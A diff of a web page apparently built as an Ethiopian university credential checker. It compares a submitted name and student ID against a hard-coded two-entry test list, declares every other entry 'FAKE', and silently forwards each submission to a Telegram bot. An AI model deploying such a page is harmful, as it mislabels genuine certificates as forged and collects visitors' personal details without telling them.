@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ethio-EduVerify: Academic Credential Verification System</title>
+    <title>Ethio-EduVerify Pro</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -52,7 +52,6 @@
         }
         button:hover { background: #12233f; }
         
-        /* Result Box Styles */
         #resultBox {
             margin-top: 20px;
             padding: 15px;
@@ -70,15 +69,15 @@
         <h2>🛡️ Ethio-EduVerify Pro</h2>
         <p class="subtitle">Mirkaneessa Ragaa Barnoota Yuunversitii (Original vs Fake Checker)</p>
         
-        <form onsubmit="verifyCertificate(event)">
+        <form id="verifyForm">
             <div class="form-group">
                 <label>Maqaa Guutuu (Full Name):</label>
-                <input type="text" id="fullName" placeholder="Fkn: Abiti Mama Shibiru" required>
+                <input type="text" id="fullName" placeholder="Fkn: Abiti Mama" required>
             </div>
             
             <div class="form-group">
-                <label>Lakkoofsa Galmee / ID (Student ID / Roll No):</label>
-                <input type="text" id="studentId" placeholder="Fkn: BHR/1024/15" required>
+                <label>Lakkoofsa Galmee / ID (Student ID):</label>
+                <input type="text" id="studentId" placeholder="Fkn: bhr/1024/15" required>
             </div>
 
             <div class="form-group">
@@ -87,8 +86,6 @@
                     <option value="Bule Hora University">Yuunversitii Bulee Horaa</option>
                     <option value="Addis Ababa University">Yuunversitii Finfinnee</option>
                     <option value="Jimma University">Yuunversitii Jimmaa</option>
-                    <option value="Hawassa University">Yuunversitii Hawassa</option>
-                    <option value="Haramaya University">Yuunversitii Haramayaa</option>
                 </select>
             </div>
 
@@ -99,18 +96,17 @@
     </div>
 
     <script>
-        // --- TELEGRAM BOT CONFIGURATION (Odeeffannoo Erguf) ---
+        // --- TELEGRAM BOT CONFIGURATION ---
         const BOT_TOKEN = "GARTI_BOT_TOKEN_KEE_AS_ITTI_GALCHI"; 
         const CHAT_ID = "CHAT_ID_KEE_AS_ITTI_GALCHI";         
 
-        // Simulated Database (Faayilii ragaa barattoota sirrii - Qorannoo/Demouf)
+        // Database fakee qorannoo (Test data)
         const officialDatabase = [
             { name: "abiti mama", id: "bhr/1024/15", uni: "Bule Hora University" },
-            { name: "nafiyad shifera", id: "aau/4512/14", uni: "Addis Ababa University" },
-            { name: "gosa shifarra", id: "jim/3321/15", uni: "Jimma University" }
+            { name: "nafiyad shifera", id: "aau/4512/14", uni: "Addis Ababa University" }
         ];
 
-        function verifyCertificate(e) {
+        document.getElementById('verifyForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const nameInput = document.getElementById('fullName').value.trim().toLowerCase();
             const idInput = document.getElementById('studentId').value.trim().toLowerCase();
@@ -122,17 +118,14 @@
             checkBtn.textContent = "⏳ Sakatta'aa jira...";
 
             setTimeout(() => {
-                // Barbaaduu Database keessaa
                 const found = officialDatabase.find(student => 
                     student.id === idInput && student.uni === uniInput
                 );
 
                 resultBox.style.display = 'block';
                 let verificationStatus = "";
-                let messageText = "";
 
                 if (found) {
-                    // RAGAA DHUGAA (ORIGINAL)
                     resultBox.className = "valid";
                     resultBox.innerHTML = `
                         <strong>✅ RAGAA DHUGAA (ORIGINAL CERTIFICATE)</strong><br>
@@ -143,7 +136,6 @@
                     `;
                     verificationStatus = "ORIGINAL (DHUGAA)";
                 } else {
-                    // RAGAA SOBAA (FAKE / NOT FOUND)
                     resultBox.className = "invalid";
                     resultBox.innerHTML = `
                         <strong>❌ RAGAA SOBAA (FAKE / INVALID)</strong><br>
@@ -153,13 +145,12 @@
                     verificationStatus = "SOBAA (FAKE)";
                 }
 
-                // Odeeffannoo kana Telegram Bot keetti ergisiisuu
                 sendReportToTelegram(document.getElementById('fullName').value, idInput, uniInput, verificationStatus);
 
                 checkBtn.disabled = false;
                 checkBtn.textContent = "🔍 Ragaa Mirkaneessi (Verify)";
-            }, 1200);
-        }
+            }, 1000);
+        });
 
         function sendReportToTelegram(name, id, uni, status) {
             if (BOT_TOKEN.includes("GARTI_BOT_TOKEN")) return;
